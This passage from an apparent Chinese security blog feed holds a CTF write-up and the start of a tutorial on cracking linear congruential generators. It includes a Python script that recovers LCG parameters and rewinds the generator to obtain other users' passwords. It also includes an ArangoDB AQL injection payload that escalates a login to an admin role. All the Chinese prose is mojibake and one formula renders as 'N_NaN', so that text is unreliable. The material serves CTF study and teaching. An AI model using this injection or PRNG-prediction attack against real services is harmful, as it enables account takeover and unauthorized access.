class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(b, n)</span>:</span></span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span></span><br><span class="line">    print(<span class="string">'states'</span>, states)</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">print(crack_unknown_modulus([<span class="number">4391179335210642486020975422279755323</span>, </span><br><span class="line">    <span class="number">10752978387235368639990800431243402580</span>, <span class="number">829507054147681073533941628943699170</span>, <span class="number">7191306106172407227503766637907346427</span>, <span class="number">13553105158197133381473591646870993684</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># m = 1  # the "multiplier"</span></span><br><span class="line"><span class="comment"># c = 6361799052024726153969825008963647257  # the "increment"</span></span><br><span class="line"><span class="comment"># n = 16285270385112413720426683811263350667  # the "modulus"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prng_lcg</span>:</span></span><br><span class="line">    m = <span class="number">1</span>  <span class="comment"># the "multiplier"</span></span><br><span class="line">    c = <span class="number">6361799052024726153969825008963647257</span>  <span class="comment"># the "increment"</span></span><br><span class="line">    n = <span class="number">16285270385112413720426683811263350667</span>  <span class="comment"># the "modulus"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.state = seed  <span class="comment"># the "seed"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = (self.state * self.m + self.c) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prev</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = (self.state - self.c) % self.n</span><br><span class="line">        <span class="keyword">return</span> int(self.state)</span><br><span class="line"></span><br><span class="line"><span class="comment">#User Number: 46 </span></span><br><span class="line"><span class="comment">#Password: 15591686419057701451952140284790119739 </span></span><br><span class="line"></span><br><span class="line">gen = prng_lcg(<span class="number">15591686419057701451952140284790119739</span>) </span><br><span class="line"></span><br><span class="line">num = <span class="number">45</span></span><br><span class="line"><span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">    p = gen.prev()</span><br><span class="line">    print(num, p)</span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">4391179335210642486020975422279755323</span>:</span><br><span class="line">        print(<span class="string">'sanity check: working'</span>)</span><br><span class="line">    num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 =&gt; 6160325624856057770563639672902954513</span></span><br></pre></td></tr></table></figure><p>æœ€åç™»å½•å¾—åˆ°flag<br><a href="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" alt="å±å¹•å¿«ç…§ 2018-11-02 ä¸‹åˆ5.23.43.png"></a></p><p>PS:å…³äºæ­¤å¤„LCGæ”»å‡»ï¼Œä½ å¯ä»¥æŸ¥çœ‹<a href="http://zeroyu.xyz/2018/11/02/Cracking-LCG/" target="_blank" rel="noopener">ã€Šæ”»å‡»çº¿æ€§åŒä½™ç”Ÿæˆå™¨(LCG)ã€‹</a></p><h1 id="H-pster-Startup"><a href="#H-pster-Startup" class="headerlink" title="H!pster Startup"></a>H!pster Startup</h1><p>ä¸»é¡µä»£ç é‡Œå¯ä»¥æ‰¾åˆ°åå°ï¼Œæ‰€ä»¥å°±ä¸ç”¨æ‰«æäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  Main navigation  --&gt;</span><br><span class="line">&lt;ul class=&quot;main-nav nav navbar-nav navbar-right&quot;&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;#home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;#service&quot;&gt;Services&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;!-- &lt;li&gt;&lt;a href=&quot;/admin&quot;&gt;Admin-Panel&lt;/a&gt;&lt;/li&gt; --&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;!-- /Main navigation --&gt;</span><br></pre></td></tr></table></figure><p>åå°æµ‹è¯•å‘ç°æ˜¯ArangoDBå¹¶ä¸”ä½¿ç”¨pyArangoè¿›è¡Œé©±åŠ¨ç¨‹åºã€‚æºç ä¸­å­˜åœ¨å¦‚ä¸‹å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦<code>_id</code>å‚æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try :</span><br><span class="line">    collection = self.database[docJson[&quot;_id&quot;].split(&quot;/&quot;)[0]]</span><br><span class="line">except KeyError :</span><br><span class="line">    raise CreationError(&quot;result %d is not a valid Document. Try setting rawResults to True&quot; % i)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆçš„payloadä¸º:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user: &apos; || 1 RETURN &#123;_id: u._id, role:&apos;admin&apos;&#125; //</span><br></pre></td></tr></table></figure></p><p>flagä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æˆ‘åœ¨å†™noteçš„æ—¶å€™ï¼Œå®˜æ–¹çš„é¢˜ç›®å·²ç»å…³é—­äº†ï¼Œæ‰€ä»¥åˆ—å‡ºä¸€äº›å‚è€ƒ:</p><p><a href="https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-hpster-startup-write-up-web216/" target="_blank" rel="noopener">[P.W.N. CTF 2018] H!pster Startup Write-up (Web216)</a></p><p><a href="https://0day.work/p-w-n-university-web-200-h-pster-startup-writeup/" target="_blank" rel="noopener">P.W.N University: web 200 - H!pster Startup writeup</a></p><p><a href="https://xz.aliyun.com/t/3096#toc-5" target="_blank" rel="noopener">ã€ŠP.W.N. CTF webé¢˜è§£ã€‹</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Login-Sec&quot;&gt;&lt;a href=&quot;#Login-Sec&quot; class=&quot;headerlink&quot; title=&quot;Login Sec&quot;&gt;&lt;/a&gt;Login Sec&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Login 1&lt;/strong&gt;çš„ä»£ç å¦‚ä¸‹:&lt;/p&gt;
&lt;figure
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>æ”»å‡»çº¿æ€§åŒä½™ç”Ÿæˆå™¨(LCG)</title>
    <link href="http://zer0yu.github.io/2018/11/02/Cracking-LCG/"/>
    <id>http://zer0yu.github.io/2018/11/02/Cracking-LCG/</id>
    <published>2018-11-01T16:19:50.000Z</published>
    <updated>2018-11-02T10:11:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ç›®å‰æˆ‘ä»¬åœ¨ç¼–ç¨‹ä¸­ç»å¸¸ä¼šä½¿ç”¨éšæœºæ•°ï¼Œä½†æ˜¯å…¶ä¸­ä¼šä¸ä¼šå­˜åœ¨ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿè¦çŸ¥é“CPUè®¡ç®—ä¸­çš„å„ç§çŠ¶æ€éƒ½æ˜¯ç¡®å®šçš„ï¼Œåœ¨å…¶ä¸­çš„éšæœºæ•°ä¸æ˜¯å‡­ç©ºäº§ç”Ÿçš„ï¼Œæ‰€ä»¥è¿™ç§éšæœºæ•°çœŸçš„éšæœºå—ï¼Ÿç›®å‰ç”Ÿæˆéšæœºæ•°çš„æ–¹å¼ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç§:</p><ul><li>ç¡¬ä»¶éšæœºæ•°ç”Ÿæˆå™¨</li><li>åˆ©ç”¨ç°æœ‰ç¡¬ä»¶ï¼Œä»éé¢„æœŸæ–¹å¼äº§ç”Ÿéšæœºæ•°(æ¯”å¦‚åˆ©ç”¨éŸ³é¢‘çš„äº§ç”Ÿã€ç¡¬ç›˜å¯»å€æ—¶é—´ç­‰)</li><li>ä¼ªéšæœºæ•°</li><li>é‡å­æŠ€æœ¯</li></ul><p>PS: RDRANDæŒ‡ä»¤äº§ç”Ÿçš„éšæœºæ•°ç›®å‰å­˜åœ¨äº‰è®®ï¼Œåœ¨æ­¤ä¸åšè¯¦ç»†è®¨è®ºã€‚æœ‰å…´è¶£å¯ä»¥å‚è€ƒ <a href="https://zh.wikipedia.org/wiki/RdRand" target="_blank" rel="noopener">RdRand</a></p><p>è™½ç„¶é€‰æ‹©å¾ˆå¤šï¼Œä½†æ˜¯ç›®å‰è¿˜æ˜¯ä¸»è¦é‡‡ç”¨ä¼ªéšæœºæ•°çš„æ–¹å¼æ¥åº”å¯¹å®é™…å¼€å‘ä¸­éœ€è¦çš„åœºæ™¯ã€‚ç”¨äºäº§ç”Ÿè¿™äº›çœ‹èµ·æ¥éšæœºä½†å®é™…æ˜¯ç”±ç¡®å®šæ€§ç®—æ³•ç”Ÿæˆæ•°å­—çš„æœºåˆ¶è¢«ç§°ä¸ºâ€ä¼ªéšæœºæ•°å‘ç”Ÿå™¨â€ï¼Œç®€ç§°ä¸ºPRNGã€‚</p><p>PRNGçš„ä¸­å¿ƒæ˜¯ç¡®å®šçš„ï¼Œå¦‚æœæ”»å‡»è€…çŸ¥é“å…¶å†…éƒ¨çš„å®Œæ•´çŠ¶æ€ï¼Œåˆ™å¯ä»¥å¯¹æœªæ¥çš„å€¼å’Œè¿‡å»çš„å€¼è¿›è¡Œé¢„æµ‹ã€‚å¦‚æœPRNGè¢«ç”¨äºåŠ å¯†å¯†é’¥ã€ç”Ÿæˆè¯ä¹¦ç­‰åœºæ™¯ï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘å°†è¯¦ç»†è®²è§£å¯¹çº¿æ€§åŒä½™å‘ç”Ÿå™¨çš„æ”»å‡»ã€‚</p><h2 id="0x01-çº¿æ€§åŒä½™ç”Ÿæˆå™¨-LCG"><a href="#0x01-çº¿æ€§åŒä½™ç”Ÿæˆå™¨-LCG" class="headerlink" title="0x01 çº¿æ€§åŒä½™ç”Ÿæˆå™¨(LCG)"></a>0x01 çº¿æ€§åŒä½™ç”Ÿæˆå™¨(LCG)</h2><h3 id="1-çº¿æ€§åŒä½™æ–¹æ³•"><a href="#1-çº¿æ€§åŒä½™æ–¹æ³•" class="headerlink" title="1.çº¿æ€§åŒä½™æ–¹æ³•"></a>1.çº¿æ€§åŒä½™æ–¹æ³•</h3><p>çº¿æ€§åŒä½™æ–¹æ³•ï¼ˆLCGï¼‰æ˜¯ä¸ªäº§ç”Ÿä¼ªéšæœºæ•°çš„æ–¹æ³•ã€‚</p><p>å®ƒæ˜¯æ ¹æ®é€’å½’å…¬å¼ï¼š</p><p><html><br><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/0977413db70881e55ed0f0dd154d7314f0f4499a" class="mwe-math-fallback-image-inline" aria-hidden="true" style="vertical-align: -1.005ex; width:33.874ex; height:3.009ex;" alt="N_NaN\equiv (A\times N_{j}+B){\pmod  {M}}"><br></html><br>å…¶ä¸­A,B,Mæ˜¯äº§ç”Ÿå™¨è®¾å®šçš„å¸¸æ•°ã€‚</p><p>LCGçš„å‘¨æœŸæœ€å¤§ä¸º Mï¼Œä½†å¤§éƒ¨åˆ†æƒ…å†µéƒ½ä¼šå°‘äºMã€‚è¦ä»¤LCGè¾¾åˆ°æœ€å¤§å‘¨æœŸï¼Œåº”ç¬¦åˆä»¥ä¸‹æ¡ä»¶ï¼š</p><ol><li>B,Mäº’è´¨ï¼›</li><li>Mçš„æ‰€æœ‰è´¨å› æ•°éƒ½èƒ½æ•´é™¤A-1ï¼›</li><li>è‹¥Mæ˜¯4çš„å€æ•°ï¼ŒA-1ä¹Ÿæ˜¯ï¼›</li><li>A,B,N[0]éƒ½æ¯”Må°ï¼›</li><li>A,Bæ˜¯æ­£æ•´æ•°ã€‚</li></ol><h3 id="2-Pythonä»£ç å®ç°"><a href="#2-Pythonä»£ç å®ç°" class="headerlink" title="2.Pythonä»£ç å®ç°"></a>2.Pythonä»£ç å®ç°</h3><p>ç”±ä¸Šé¢çš„åŸç†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯å®šä¹‰äº†ä¸‰ä¸ªæ•´æ•°ï¼Œä¹˜æ•°Aã€å¢é‡Bå’Œæ¨¡æ•°Mï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ­¤ç”¨ç®€å•çš„å‡ è¡ŒPythonä»£ç å®ç°ä¸€ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class prng_lcg:</span><br><span class="line">    m = 672257317069504227  # &quot;ä¹˜æ•°&quot;</span><br><span class="line">    c = 7382843889490547368  # &quot;å¢é‡&quot;</span><br><span class="line">    n = 9223372036854775783  # &quot;æ¨¡æ•°&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, seed):</span><br><span class="line">        self.state = seed  # the &quot;seed&quot;</span><br><span class="line"></span><br><span class="line">    def next(self):</span><br><span class="line">        self.state = (self.state * self.m + self.c) % self.n</span><br><span class="line">        return self.state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    gen = prng_lcg(123)  # seed = 123</span><br><span class="line">    print gen.next()  # ç¬¬ä¸€ä¸ªç”Ÿæˆå€¼</span><br><span class="line">    print gen.next()  # ç¬¬äºŒä¸ªç”Ÿæˆå€¼</span><br><span class="line">    print gen.next()  # ç¬¬ä¸‰ä¸ªç”Ÿæˆå€¼</span><br></pre></td></tr></table></figure><h3 id="3-LCGçš„ä¼˜ç¼ºç‚¹"><a href="#3-LCGçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="3.LCGçš„ä¼˜ç¼ºç‚¹"></a>3.LCGçš„ä¼˜ç¼ºç‚¹</h3><p>LCGç›®å‰æ˜¯åˆ†æµè¡Œï¼Œå¾—ç›Šäºå…¶åœ¨æ•°å­¦è¡¨è¾¾å®ç°ä¸Šååˆ†ä¼˜é›…ã€éå¸¸å®¹æ˜“ç†è§£å¹¶ä¸”å®¹æ˜“è®¾è®¡å®ç°ã€è®¡ç®—é€Ÿåº¦å¯ä»¥éå¸¸å¿«ã€‚ä½†æ˜¯å®ƒä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºç‚¹ï¼Œæ¯”å¦‚å®ƒåœ¨åŠ å¯†å®‰å…¨æ€§æ–¹é¢ååˆ†å¼±ã€‚æ¥ä¸‹æ¥å°†ä»ä»¥ä¸‹å‡ ç§æƒ…å†µå¯¹å…¶è¿›è¡Œæ”»å‡»ã€‚</p><h2 id="0x02-æ”»å‡»LCG"><a href="#0x02-æ”»å‡»LCG" class="headerlink" title="0x02 æ”»å‡»LCG"></a>0x02 æ”»å‡»LCG</h2><h3 id="1-å¯¹äºAã€Bã€Mä»¥åŠN0å·²çŸ¥çš„æƒ…å†µ"><a href="#1-å¯¹äºAã€Bã€Mä»¥åŠN0å·²çŸ¥çš„æƒ…å†µ" class="headerlink" title="1. å¯¹äºAã€Bã€Mä»¥åŠN0å·²çŸ¥çš„æƒ…å†µ"></a>1. å¯¹äºAã€Bã€Mä»¥åŠN0å·²çŸ¥çš„æƒ…å†µ</h3><p>å‡è®¾æˆ‘ä»¬è§‚å¯Ÿåˆ°æœ‰ä¸€ä¸ªLCGç³»ç»Ÿäº§ç”Ÿäº†ä»¥ä¸‹ä¸‰ç»„è¿ç»­çš„å€¼ï¼Œå¹¶ä¸”æˆ‘ä»¬çŸ¥é“å†…éƒ¨çš„å‚æ•°å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‰ç»„è¿ç»­çš„å€¼</span><br><span class="line">s0 = 2300417199649672133</span><br><span class="line">s1 = 2071270403368304644</span><br><span class="line">s2 = 5907618127072939765</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># å†…éƒ¨çš„å‚æ•°</span><br><span class="line">m = 672257317069504227   # the &quot;multiplier&quot;</span><br><span class="line">c = 7382843889490547368  # the &quot;increment&quot;</span><br><span class="line">n = 9223372036854775783  # the &quot;modulus&quot;</span><br></pre></td></tr></table></figure><p>åœ¨å·²çŸ¥äº†è¿™äº›å‚æ•°ä¹‹åæˆ‘ä»¬å¯ä»¥å¾ˆå¿«çš„æ¨ç®—å‡ºæœªæ¥çš„æ•°å€¼æˆ–è€…ä¹‹å‰çš„æŸä¸ªæ•°å€¼ï¼Œæ‰€ä»¥è¿˜æ˜¯å­˜åœ¨å®‰å…¨é—®é¢˜çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In [1]: m = 672257317069504227</span><br><span class="line"></span><br><span class="line">In [2]: c = 7382843889490547368</span><br><span class="line"></span><br><span class="line">In [3]: n = 9223372036854775783</span><br><span class="line"></span><br><span class="line">In [4]: s0 = 2300417199649672133</span><br><span class="line"></span><br><span class="line">In [5]: s1 = (s0*m + c) % n</span><br><span class="line"></span><br><span class="line">In [6]: s2 = (s1*m + c) % n</span><br><span class="line"></span><br><span class="line">In [7]: s3 = (s2*m + c) % n</span><br><span class="line"></span><br><span class="line">In [8]: s4 = (s3*m + c) % n</span><br><span class="line"></span><br><span class="line">In [9]: s1</span><br><span class="line">Out[9]: 2071270403368304644L</span><br><span class="line"></span><br><span class="line">In [10]: s2</span><br><span class="line">Out[10]: 5907618127072939765L</span><br><span class="line"></span><br><span class="line">In [11]: s3</span><br><span class="line">Out[11]: 5457707446309988294L</span><br></pre></td></tr></table></figure><h3 id="2-å¢é‡æœªçŸ¥"><a href="#2-å¢é‡æœªçŸ¥" class="headerlink" title="2.å¢é‡æœªçŸ¥"></a>2.å¢é‡æœªçŸ¥</h3><p>æˆ‘ä»¬ä¸æ¸…æ¥šå¢é‡ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ä»¥ä¸‹ä¿¡æ¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = 81853448938945944</span><br><span class="line">c = # unknown</span><br><span class="line">n = 9223372036854775783</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># åˆå€¼å’Œç¬¬ä¸€ä¸ªè®¡ç®—å€¼</span><br><span class="line">s0 = 4501678582054734753</span><br><span class="line">s1 = 4371244338968431602</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¨ç¨æ”¹å†™ä¸‹å…¬å¼å°±å¯ä»¥å°†ç›®æ ‡cè®¡ç®—å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 = s0*m + c   (mod n)</span><br><span class="line"></span><br><span class="line">c  = s1 - s0*m  (mod n)</span><br></pre></td></tr></table></figure><p>æ­¤ç§ç±»å‹Pythonæ”»å‡»ä»£ç å¦‚ä¸‹æ‰€ç¤º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def crack_unknown_increment(states, modulus, multiplier):</span><br><span class="line">    increment = (states[1] - states[0]*multiplier) % modulus</span><br><span class="line">    return modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line">print crack_unknown_increment([4501678582054734753, 4371244338968431602], 9223372036854775783, 81853448938945944)</span><br></pre></td></tr></table></figure><h3 id="3-å¢é‡å’Œä¹˜æ•°éƒ½æœªçŸ¥"><a href="#3-å¢é‡å’Œä¹˜æ•°éƒ½æœªçŸ¥" class="headerlink" title="3.å¢é‡å’Œä¹˜æ•°éƒ½æœªçŸ¥"></a>3.å¢é‡å’Œä¹˜æ•°éƒ½æœªçŸ¥</h3><p>æˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“å¢é‡å’Œä¹˜æ•°ä½†æ˜¯æˆ‘ä»¬çŸ¥é“ä»¥ä¸‹æ•°å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = # unknown</span><br><span class="line">c = # unknown</span><br><span class="line">n = 9223372036854775783</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># LCGç”Ÿæˆçš„åˆå€¼å’Œåé¢ç”Ÿæˆçš„ä¸¤ä¸ªå€¼</span><br><span class="line">s0 = 6473702802409947663</span><br><span class="line">s1 = 6562621845583276653</span><br><span class="line">s2 = 4483807506768649573</span><br></pre></td></tr></table></figure><p>è§£å†³åŠæ³•å¾ˆç®€å•ï¼Œæƒ³æƒ³æ€ä¹ˆè§£çº¿æ€§æ–¹ç¨‹ç»„å°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s_1 = s0*m + c  (mod n)</span><br><span class="line">s_2 = s1*m + c  (mod n)</span><br><span class="line"></span><br><span class="line">s_2 - s_1 = s1*m - s0*m  (mod n)</span><br><span class="line">s_2 - s_1 = m*(s1 - s0)  (mod n)</span><br><span class="line">m = (s_2 - s_1)/(s_1 - s_0)  (mod n)</span><br></pre></td></tr></table></figure><p>æ­¤ç§ç±»å‹Pythonæ”»å‡»ä»£ç å¦‚ä¸‹æ‰€ç¤º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def crack_unknown_multiplier(states, modulus):</span><br><span class="line">    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus</span><br><span class="line">    return crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line">print crack_unknown_multiplier([6473702802409947663, 6562621845583276653, 4483807506768649573], 9223372036854775783)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç®—æ³•ä¸­åº”ç”¨åˆ°äº†æ±‚æ¨¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦é€†æ¨ã€‚è¯¦æƒ…å‚è€ƒ: <a href="https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm#Python" target="_blank" rel="noopener">Recursive algorithm</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        return (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line">def modinv(b, n):</span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    if g == 1:</span><br><span class="line">        return x % n</span><br></pre></td></tr></table></figure><h3 id="4-å¢é‡ï¼Œä¹˜æ•°å’Œæ¨¡æ•°å‡æœªçŸ¥"><a href="#4-å¢é‡ï¼Œä¹˜æ•°å’Œæ¨¡æ•°å‡æœªçŸ¥" class="headerlink" title="4.å¢é‡ï¼Œä¹˜æ•°å’Œæ¨¡æ•°å‡æœªçŸ¥"></a>4.å¢é‡ï¼Œä¹˜æ•°å’Œæ¨¡æ•°å‡æœªçŸ¥</h3><p>ç°åœ¨å†…éƒ¨çŠ¶æ€åŸºæœ¬æ˜¯éƒ½ä¸çŸ¥é“äº†ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“åˆå€¼å’ŒéšåLCGäº§ç”Ÿçš„è¿ç»­çš„å‡ ä¸ªå€¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = # unknown</span><br><span class="line">c = # unknown</span><br><span class="line">n = # unknown</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s0 = 2818206783446335158</span><br><span class="line">s1 = 3026581076925130250</span><br><span class="line">s2 = 136214319011561377</span><br><span class="line">s3 = 359019108775045580</span><br><span class="line">s4 = 2386075359657550866</span><br><span class="line">s5 = 1705259547463444505</span><br><span class="line">s6 = 2102452637059633432</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡ç”¨çº¿æ€§æ–¹ç¨‹å¼ä¸å¥½è§£å†³çš„äº†ï¼Œå› ä¸ºå¯¹äºæ¯ä¸€ä¸ªæ–¹ç¨‹ï¼Œæˆ‘ä»¬æ˜¯ä¸çŸ¥é“å‰ä¸€ä¸ªæ¨¡æ•°ï¼Œå› æ­¤æˆ‘ä»¬å°†å½¢æˆçš„æ¯ä¸ªæ–¹ç¨‹éƒ½ä¼šå¼•å…¥æ–°çš„æœªçŸ¥é‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 = s0*m + c  (mod n)</span><br><span class="line">s2 = s1*m + c  (mod n)</span><br><span class="line">s3 = s2*m + c  (mod 